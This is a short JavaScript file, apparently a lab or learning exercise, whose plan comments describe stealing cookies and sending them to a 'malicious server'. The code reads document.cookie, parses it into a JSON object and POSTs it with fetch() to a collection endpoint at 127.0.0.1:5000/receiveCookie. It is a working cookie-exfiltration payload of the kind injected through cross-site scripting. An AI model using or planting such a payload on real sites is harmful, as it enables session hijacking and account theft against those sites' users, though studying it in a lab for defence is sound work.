//PLAN & TODO
//  create array? map? to store cookies
//  turn object into json data
//  send to malicious server
//  server stores data into db

var cookie = document.cookie;
cookie = cookie.split(";")

var cookieMap = {}
cookie.forEach(element => {
  let [key, value] = element.split("=");
  cookieMap[key.trim()] = value.trim();
  
});

var jsonData = JSON.stringify(cookieMap);

// Send the data using fetch()
fetch("http://127.0.0.1:5000/receiveCookie", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json"
  },
  body: jsonData, 
})
.then(response => {
  if (response.status === 204) {
  } else {
  }
  })
